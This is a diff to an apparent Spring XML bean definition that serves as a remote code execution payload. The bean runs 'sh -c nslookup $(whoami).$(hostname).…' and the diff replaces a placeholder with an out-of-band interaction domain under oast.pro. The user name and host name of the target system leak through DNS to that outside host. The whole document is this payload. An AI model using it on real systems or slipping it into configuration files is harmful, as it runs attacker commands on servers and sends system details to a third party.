@@ -8,7 +8,7 @@
             <list>
                 <value>sh</value>
                 <value>-c</value>
-                <value>nslookup $(whoami).$(hostname).URL</value>
+                <value>nslookup $(whoami).$(hostname).dbtd06nq9ehgjl2fgutg9iddx9abgmzia.oast.pro</value>
             </list>
         </constructor-arg>
     </bean>
